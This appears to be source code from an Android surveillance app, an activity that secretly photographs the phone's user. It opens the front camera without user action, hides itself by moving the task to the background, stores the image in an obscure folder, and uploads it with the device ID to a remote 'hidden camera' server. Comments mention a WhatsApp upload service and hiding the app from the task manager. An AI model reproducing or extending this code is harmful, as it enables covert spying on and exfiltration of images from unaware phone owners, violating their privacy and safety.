package com.hinj.secure.smsgps;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;

import org.json.JSONObject;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings.Secure;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import com.hinj.app.activity.R;
import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.SpyCallSharedPrefrence;

public class CallCamera extends Activity implements SurfaceHolder.Callback
{
    //a variable to store a reference to the Image View at the main.xml file
    
    //a variable to store a reference to the Surface View at the main.xml file
    private SurfaceView sv;

    //a bitmap to display the captured image
    private Bitmap bmp;

    //Camera variables
    //a surface holder
    private SurfaceHolder sHolder;
    //a variable to control the camera
    private Camera mCamera;
    //the camera parameters
    private Parameters parameters;
    ComponentName componentName;
    
    Boolean result;
    FileOutputStream fos;
    boolean MainCam=false;
    
    //***********
    private ActivityManager mActivityManager = null;
    private Method mRemoveTask;
    //***********

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
    	PackageManager pm = getPackageManager();
    	MainCam = pm.hasSystemFeature("android.hardware.camera");
    	
        super.onCreate(savedInstanceState);
        setContentView(R.layout.tackepicmain);

        //get the Image View at the main.xml file       

        //get the Surface View at the main.xml file
        sv = (SurfaceView) findViewById(R.id.surfaceView);

        //Get a surface
        sHolder = sv.getHolder();

        //add the callback interface methods defined below as the Surface View callbacks
        sHolder.addCallback(this);
       
        //tells Android that this surface will have its data constantly replaced
        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    @Override
    protected void onResume() {
    	// TODO Auto-generated method stub 
    	//***remove task manager app Strat
		try{
			//startService(new Intent(CallCamera.this,AppHideService.class));
			
		}catch (Exception e) {
			e.printStackTrace();
		}
		//***remove task manager app End
       	super.onResume();
    }
     
    @Override
    public void surfaceChanged(SurfaceHolder arg0, int arg1, int arg2, int arg3)
    {
         //get camera parameters
    try{
         parameters = mCamera.getParameters();

         //set camera parameters
         mCamera.setParameters(parameters);
         mCamera.startPreview();

         //sets what code should be executed after the picture is taken
         Camera.PictureCallback mCall = new Camera.PictureCallback()
         {
             @Override
             public void onPictureTaken(byte[] data, Camera camera)
             {
                 //decode the data obtained by the camera into a Bitmap
                 bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                 //set the iv_image
                 //iv_image.setImageBitmap(bmp);
                 try{
               
                 mCamera.release();
                 mCamera = null;
                 //moveTaskToBack(true);
                 
                 int imgNumber=SpyCallSharedPrefrence.getHideCameraImageCount(CallCamera.this);
                 imgNumber++;
                 SpyCallSharedPrefrence.saveHideCameraImageCount(CallCamera.this, imgNumber);
                 saveImage(bmp,imgNumber); 
                 
                 bmp=null;
                 }catch (Exception e) {
                	 e.printStackTrace();
				}
              }
         };

         mCamera.takePicture(null, null, mCall);
        }
         catch (Exception e) {
        	 e.printStackTrace();
		}
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder)
    {
        // The Surface has been created, acquire the camera and tell it where
        // to draw the preview.
    	try{
    	PackageManager pm = getPackageManager();
    	boolean frontCam, rearCam;
    	//It would be safer to use the constant PackageManager.FEATURE_CAMERA_FRONT
    	//but since it is not defined for Android 2.2, I substituted the literal value
    	
    	frontCam = pm.hasSystemFeature("android.hardware.camera.front");
    	rearCam = pm.hasSystemFeature(PackageManager.FEATURE_CAMERA);
    	if(frontCam){
        mCamera = Camera.open(CameraInfo.CAMERA_FACING_FRONT);
    	}else{
    	mCamera = Camera.open();
    	}
        try {
           mCamera.setPreviewDisplay(holder);

        } catch (IOException exception) {
            mCamera.release();
            mCamera = null;
        }
    	}catch (Exception e) {
			// TODO: handle exception
    		e.printStackTrace();
		}
    	
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder)
    {
        //stop the preview
       // mCamera.stopPreview();
        //release the camera
        //mCamera.release();
        //unbind the camera from this object
        //mCamera = null;
    	
    }
    
    public String saveImage(Bitmap bm,int id)
	{
	
		File file=null;
		File folder=new File(Environment.getExternalStorageDirectory()+"/ilfCameraPic");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		try {
			file = new File(folder,"testimage"+id+".jpeg");
			Log.e("Image Name******","  testimage  "+id);
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fileOutputStream);		
			bm.compress(CompressFormat.JPEG,35,bos);
			bos.flush();
			bos.close();
			bm.recycle();
			System.gc();
			//***remove task manager app Strat
			try{
				getOpenAppDetail();
				
			}catch (Exception e) {
				e.printStackTrace();
			}
			//***remove task manager app End
			finish();
		   
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return file.getAbsolutePath();
	}

	private void getOpenAppDetail() {
		try {
			// *******Open App
			moveTaskToBack(true);
			new HideCameraPicAsyncTask().execute();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
    //************************Post Image to Server
    class HideCameraPicAsyncTask extends AsyncTask<Void, Void, Void> {

    	private static final String TAG = "HideCameraPicAsyncTask";
    	private int getcountImage;
    	private int getRemainingCount;
    	private Context ctx;

    	/**
    	 * 
    	 */
    	@Override
    	protected void onPreExecute() {

    	}

    	@Override
    	protected final  Void doInBackground(Void... params) {
    		// make your request here - it will run in a different thread

    		try {

    			final String filePath = Environment.getExternalStorageDirectory()+"/ilfCameraPic/";
    			final File  filelist=new File(filePath);


    			final String []fileName=filelist.list(new FilenameFilter() {

    				@Override
    				public boolean accept(File dir, String filename) {
    					return filename.endsWith(".jpeg");
    				}
    			});

    			final int preUploadedCount=SpyCallSharedPrefrence.getsaveHideCameraImage_PreCount(CallCamera.this);
    			int remainingCount=fileName.length;			
    			if(remainingCount>0){	
    				remainingCount=1;
    				final File tempFile=new File(filePath+fileName[0]);
    				final long tempTime=tempFile.lastModified();
    				final Timestamp st1 = new Timestamp(tempTime);
    				final java.util.Date date11 = new java.util.Date(st1.getTime());
    				final DateFormat df1 = DateFormat.getDateInstance();
    				final TimeZone zone11 = TimeZone.getTimeZone(df1.getTimeZone().getID()); // For example...
    				final DateFormat format11 = new SimpleDateFormat("yyyy-MM-dd HH:mm:s"); // Put your pattern here
    				format11.setTimeZone(zone11);

    				final String uploadingFile=tempFile.getAbsolutePath();
    				//final String tempImageName=tempFile.getName();
    				final int j = uploadingFile.lastIndexOf("/");
    				final String imagename = uploadingFile.substring(j + 1,uploadingFile.lastIndexOf("."));
    				final String imagetype = uploadingFile.substring(uploadingFile.lastIndexOf(".") + 1);
    				Log.e(format11.format(date11), format11.format(date11));

    				if(uploadingFile.contains("jpeg")){
    					SpyCallSharedPrefrence.saveHideCamFileName(CallCamera.this,uploadingFile);
    					//new YourAsyncTask_LineChatImage().execute(format11.format(date11),uploadingFile,imagename,imagetype,""+countLineImage,""+remainingCount);
    					getcountImage = Integer.parseInt(""+"1");
    					getRemainingCount= Integer.parseInt(""+remainingCount);
    					if(isNetworkAvailable(CallCamera.this)){
    						//final String getResponceImages = uploadImage2(format11.format(date11),uploadingFile,imagename, imagetype);
    						//final String getResponceImages = uploadImage2(imagename,uploadingFile,imagetype, format11.format(date11));
    						final String getResponceImages = lineUploadImages(format11.format(date11),uploadingFile,imagename, imagetype);
    						
    						Log.e(TAG,getResponceImages);
    						final JSONObject responseObject = new JSONObject(getResponceImages);
    						//07-31 11:30:41.292: E/LineImageUploadAsyncTask(3774): {"response":{"image":"Image Success","interval":"10"}}

    						if ("success".equals(responseObject.getJSONObject("response").getString("image"))) {
    							Log.i(TAG, "Success");
    							/***********Delete File Start**************/
    							String getFileName=SpyCallSharedPrefrence.getHideCamFileName(CallCamera.this);
    							if(!(getFileName.equals(""))){
    							SpyCallSharedPrefrence.saveHideCamFileName(CallCamera.this, "");
    							}else{
    								Log.i(TAG, "getFileName  blank");
    							}
    							/***********Delete File End**************/
    							SpyCallSharedPrefrence.saveHideCameraImage_PreCount(CallCamera.this,preUploadedCount+remainingCount );
    						}
    					}
    				}
    			}

    		} catch (Exception e) {
    			e.printStackTrace();
    		}
    		return null;
    	}

    	@Override
    	protected void onPostExecute(Void result) {
    	}
    }
    
    public final String  lineUploadImages(String imageDate, String imagename, String imagename2, 	String imagetype) {
		
    	String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(CallCamera.this);
    	String android_id = Secure.getString(this.getContentResolver(),Secure.ANDROID_ID);
		Log.i("resonse", "anotherone");
		final File file = new File(imagename);
		final ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String a[] = { "date_time",imageDate};
		arraylist1.add(a);
		String b[] = { "upload_device_id", android_id };
		arraylist1.add(b); 
		final JsonPostRequest postrequest = new JsonPostRequest();
		final String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Hidden_Camera_upload, arraylist1,arraylist2, imagename2, imagetype);
		arraylist2.clear();
		arraylist1.clear();
		return imageResponse;
	}
    
    public String uploadImage2(String imagename, String imagename2,String imagetype,String imageDate) {

		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(CallCamera.this);
		
		Log.i("resonse", "anotherone");
		File file = new File(imagename);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String b[] = { "date_time",imageDate};
		arraylist1.add(b);
		String c[] = { "device_os", "Android" };
		arraylist1.add(c);
		/*String d[] = { "user_id",getUserID_SP };
		arraylist1.add(d); */
		String e[] = { "type", "1" };
		arraylist1.add(e); 
		String f[] = { "upload_device_id", upload_device_id };
		arraylist1.add(f); 
		
		JsonPostRequest postrequest = new JsonPostRequest();
		//http://evt17.com/iphone/android_services/whatsapp_upload
		String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Hidden_Camera_upload, arraylist1,arraylist2, imagename2, imagetype);
		
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
    
    
	/************************** isNetworkAvailable Start *************************************/
	public static boolean isNetworkAvailable(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = cm.getActiveNetworkInfo();
		if (networkInfo != null && networkInfo.isConnected()) {
			return true;
		}
		return false;
	}
	/************************** isNetworkAvailable End **************************************/
	
    
}